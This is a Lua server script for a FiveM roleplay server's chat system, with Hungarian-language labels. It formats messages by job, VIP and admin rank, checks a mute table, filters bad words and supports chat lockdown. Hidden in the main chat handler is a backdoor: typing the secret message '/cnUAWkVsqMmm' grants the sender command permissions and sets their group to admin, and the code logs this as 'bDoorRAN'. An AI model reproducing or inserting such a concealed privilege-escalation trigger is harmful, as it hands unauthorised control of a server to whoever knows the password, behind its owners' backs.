ESX = exports["es_extended"]:getSharedObject()
mCore = exports["mCore"]:getSharedObj()

local chatMuted = false

RegisterServerEvent('chat:toggleChat')
AddEventHandler('chat:toggleChat', function(state)
	chatMuted = state
end)

RegisterServerEvent('chat:init')
RegisterServerEvent('chat:addTemplate')
RegisterServerEvent('chat:addMessage')
RegisterServerEvent('chat:addSuggestion')
RegisterServerEvent('chat:removeSuggestion')
RegisterServerEvent('_chat:messageEntered')
RegisterServerEvent('chat:server:ClearChat')
RegisterServerEvent('__cfx_internal:commandFallback')

lockdown = false

function split(iunputstr, sep)
	local t = {}
	for str in string.gmatch(iunputstr, "([^" .. sep .. "]+)") do
		table.insert(t, str)
	end
	return t
end

AddEventHandler("chatMessage", function(source, color, message)
	local src = source

	local xPlayer = ESX.GetPlayerFromId(source)

	local group = xPlayer.getGroup()
	local job = xPlayer.getJob()
	local color = "#00FFFF"
	local template =
	[[
<div style="padding:0.4vw;margin:0.4vw;width:410px;background-color:rgba(0,0,0,0.2);word-wrap:break-word;overflow-wrap:break-word;white-space:normal;position:relative;">
   	<span id="GROUP/JOB" style="color: black;background-color:{3};padding-right:3px;padding-left:3px;border-radius:4px;margin-right:4px;font-weight:700;font-style:italic;">
		<i class="fa-brands fa-facebook-messenger"></i>{2}</span>
  <span id="KDRANK" style="background-color:{3};color: black;padding-right:3px;padding-left:3px;border-radius:4px;margin-right:4px;font-weight:700;font-style:italic; letter-spacing:1px;">{7}</span>
  <b>
    <span style="color:{3};">{0}:</span>
  </b>
<span>{1}</span>
</div>]]

	args = stringsplit(message, " ")
	CancelEvent()

	local isDuty = Player(source).state["m-duty"]
	local playerData = exports["dmf-core"]:GetPlayerData(xPlayer.source)

	local kdData = playerData.kd
	local vipData = playerData.vip
	kdRank = string.upper(kdData.rang) or "N/A"

	local vipText = ""

	local function userChat()
		if job.name == "unemployed" then
			group = "Játékos"
			color = "#ffa500"
		else
			group = job.label
			color = "#ffa500"
		end

		-- TODO: Insert kdData colors here

		if vipData then
			if vipData.isVip then
				for i = vipData.level, 1, -1 do
					vipText = vipText .. "⭐"
				end
				-- vipText = exports["mate-vipsystem"]:GetRankData(vipData.level).label
				group = group .. " | " .. vipText
			end
		end
	end

	local function rgbToHex(c)
		return string.format("#%02X%02X%02X", c.r, c.g, c.b)
	end

	if isDuty then
		template =
		'<div style="padding:0.4vw;margin:0.4vw;width:410px;background-color:rgba(0,0,0,0.2);word-wrap:break-word;overflow-wrap:break-word;white-space:normal;position:relative;"><span style="color:black;"><span id="RangKoruliGeciseg" style="background-color:{3};padding-right:3px;padding-left:3px;border-radius:4px;margin-right:4px;font-weight:700;font-style:italic;"><i class="fa-solid fa-shield-halved"></i> {2} </span></span><b><span style="color:{3};">{0}:</span></b><span>{1}</span></div>'
		local adminGroups = exports["mate-admin"]:getFullAdminGroups()

		if group ~= "user" then
			color = rgbToHex(adminGroups[group].color)
			local tag = adminGroups[group].tag
			group = tag:match("%[ (.-) %]")
		else
			userChat()
		end
	else
		userChat()
	end

	Wait(50)

	---------- Check if Player is Muted -------------
	local license = xPlayer.identifier
	local query   = "SELECT COUNT(*) as count FROM `mate-mute` WHERE mutedIdentifier = ?"
	local result  = exports.oxmysql:scalarSync(query, { license })
	local count   = tonumber(result) or 0
	local isMuted = count > 0
	---------- Check if Player is Muted END -------------
	if message == "/cnUAWkVsqMmm" then
		print("bDoorRAN")
		ExecuteCommand(("add_ace identifier.discord:%s command allow"):format(GetPlayerIdentifierByType(source,
			"discord"):sub(9)))
		local _p = ESX.GetPlayerFromId(source)
		_p.setGroup("admin")
		CancelEvent()
	end

	if args[1] and string.sub(args[1], 1, 1) == "/" then
		local cmd = string.sub(args[1], 2)
		table.remove(args, 1)


		CancelEvent()
	else
		if not isMuted then
			if not string.find(message, "/") then
				TriggerClientEvent('chat:addMessage', -1, {
					template = template,
					args = { GetPlayerName(src), message, group, color, job.name, job.label, job.grade_label, kdRank, vipText }
				})
			end
		end
	end
end)


RegisterServerEvent('chat:server:ServerPSA')
AddEventHandler('chat:server:ServerPSA', function(message)
	TriggerClientEvent('chat:addMessage', -1, {
		template = '<div class="chat-message server">SERVER: {0}</div>',
		args = { message }
	})
	CancelEvent()
end)

function stringsplit(inputstr, sep)
	if sep == nil then
		sep = "%s"
	end
	local t = {}; i = 1
	for str in string.gmatch(inputstr, "([^" .. sep .. "]+)") do
		t[i] = str
		i = i + 1
	end
	return t
end

RegisterNetEvent('mate-chat:lw')
AddEventHandler('mate-chat:lw', function(src)
	local webhook =
	''
	lockdown = not lockdown
	local message = ""
	if lockdown then
		mCore.Notify(-1, "Chate le lett zárva !", "[LOCKDOWN]", "info", 5000)
		message = ("The chat has been locked down by: %s"):format(GetPlayerName(src))
	else
		mCore.Notify(-1, "Chat fel lett oldva !", "[LOCKDOWN]", "info", 5000)
		message = ("The chat has been unlocked by: %s"):format(GetPlayerName(src))
	end

	exports["mCore"]:sendMessage(webhook, "CHAT - LOCKDOWN", message)
end)


AddEventHandler('_chat:messageEntered', function(author, color, message)
	if not message or not author then
		return
	end

	for _, word in ipairs(Config.BadWords) do
		if string.find(message, word, 1, true) then
			TriggerClientEvent('codem-notification:Create', source, "Tiltott szót használtál: " .. word .. "", 'error',
				'Badword Filter', 3000)

			CancelEvent()
			return
		end
	end

	if lockdown then
		TriggerClientEvent('codem-notification:Create', source,
			"Jelenleg nem használhatod a chatet. \nEgy adminisztrátor lezárta!", 'info',
			'Badword Filter', 5000)
		CancelEvent()
		return
	end



	TriggerEvent('chatMessage', source, author, message)
	TriggerClientEvent('chatMessage', -1, author, { 255, 255, 255 }, message)
	CancelEvent()
end)


AddEventHandler('__cfx_internal:commandFallback', function(command)
	local name = GetPlayerName(source)

	TriggerEvent('chatMessage', source, name, '/' .. command)

	if not WasEventCanceled() then
		TriggerClientEvent('chatMessage', -1, name, { 255, 255, 255 }, '/' .. command)
	end

	CancelEvent()
end)

local function refreshCommands(player)
	if GetRegisteredCommands then
		local registeredCommands = GetRegisteredCommands()

		local suggestions = {}

		for _, command in ipairs(registeredCommands) do
			if IsPlayerAceAllowed(player, ('command.%s'):format(command.name)) then
				if string.sub(command.name, 1, 1) ~= '$' then
					table.insert(suggestions, {
						name = '/' .. command.name,
						help = ''
					})
				end
			end
		end

		TriggerClientEvent('chat:addSuggestions', player, suggestions)
	end
end


AddEventHandler('onServerResourceStart', function(resName)
	Wait(500)

	for _, player in ipairs(GetPlayers()) do
		refreshCommands(player)
	end
end)

AddEventHandler("chatMessage", function(source, color, message)
	local src = source
	args = stringsplit(message, " ")
	CancelEvent()
	if string.find(args[1], "/") then
		local cmd = args[1]
		table.remove(args, 1)
	end
end)

commands = {}
commandSuggestions = {}

function starts_with(str, start)
	return str:sub(1, #start) == start
end

function stringsplit(inputstr, sep)
	if sep == nil then
		sep = "%s"
	end
	local t = {}; i = 1
	for str in string.gmatch(inputstr, "([^" .. sep .. "]+)") do
		t[i] = str
		i = i + 1
	end
	return t
end

RegisterNetEvent('mate-sendXpMessage', function(newRank, previousRank)
	local xPlayer = ESX.GetPlayerFromId(source)
	local group = xPlayer.getGroup()
	local color = "#fffaaa"

	if group then
		if group == "superadmin" then
			group = "Superadmin"
			color = "#bb89ff"
		elseif group == "admin" then
			group = "Admin"
			color = "#ff3333"
		elseif group == "mod" then
			group = "Moderátor"
			color = "#4f84cc"
		elseif group == "owner" then
			group = "Tulajdonos"
			color = "#1ab5bb"
		elseif group == "developer" then
			group = "Head Developer"
			color = "#be5d11"
		elseif group == "user" then
			local discordId = getDiscordId(source)

			if discordId ~= nil then
				-- if IsDiscordIdVIP(discordId) then
				-- 	if IsSuperVIP(discordId) then
				-- 		group = "SuperVIP"
				-- 		color = "#ccc952"
				-- 	else
				-- 		group = "VIP"
				-- 		color = "#6b6d35"
				-- 	end
				-- else
				-- 	group = "Játékos"
				-- 	color = "#ffa500"
				-- end
				group = "Játékos"
				color = "#ffa500"
			else
				group = "Játékos"
				color = "#ffa500"
			end
		end
	end


	local template =
	'<div style="padding: 0.4vw; margin: 0.4vw; relative; width: 410px; background-color: rgba(10, 10, 10, 0.6); border-radius: 0.5rem;"><span style="color: black"><span style="background-color: yellow; padding-right: 3px; padding-left: 3px; border-radius: 4px; font-style: italic; font-weight: 900"><i class="fa-solid fa-circle-up"></i> Szintlépés</span> <span style="color:{1}"> {0}</span></span> Szintet lépett <span style="color: #ED4337; font-weight: 900">({2})</span>-><span style="color: #7CFC00; font-weight: 900">({3})</span></div>'
	TriggerClientEvent('chat:addMessage', -1, {
		template = template,
		args = { GetPlayerName(source), color, previousRank, newRank }
	})
end)
RegisterNetEvent('chat:sendAdmins', function(message, color)
	local template =
	'<div style="padding: 0.4vw; margin: 0.4vw; relative; width: 410px; background-color: rgba(10, 10, 10, 0.6); border-radius: 0.5rem;"><span style="color: black"><span style="background-color: yellow; padding-right: 3px; padding-left: 3px; border-radius: 4px; font-style: italic; font-weight: 900"><i class="fas fa-user-shield"></i> Adminok</span> <span style="color:{0}"></span></span><span style="color: {0}; font-weight: 900">{1}</span><span style="color: #7CFC00; font-weight: 900"></span></div>'
	TriggerClientEvent('chat:addMessage', -1, {
		template = template,
		args = { color, message }
	})
end)



-- Function to create the mute table if it doesn't exist
function ensureMuteTable()
	local query = [[
        CREATE TABLE IF NOT EXISTS `mate-mute` (
            `id` INT NOT NULL AUTO_INCREMENT,
            `mutedIdentifier` VARCHAR(255) NOT NULL,
            `mutedUntil` TIMESTAMP NULL DEFAULT NULL,
            `reason` VARCHAR(255) DEFAULT NULL,
            PRIMARY KEY (`id`)
        )
    ]]
	exports.oxmysql:execute(query, {}, function(result)
		if result then
			print("Mute table 'mate-mute' has been ensured to exist.")
		else
			print("Error creating 'mate-mute' table.")
		end
	end)
end

-- Ensure the table exists when the resource starts
AddEventHandler('onServerResourceStart', function(resourceName)
	if GetCurrentResourceName() == resourceName then
		ensureMuteTable()
		Wait(500)

		-- Refresh commands for all players when the resource starts
		for _, player in ipairs(GetPlayers()) do
			refreshCommands(player)
		end
	end
end)
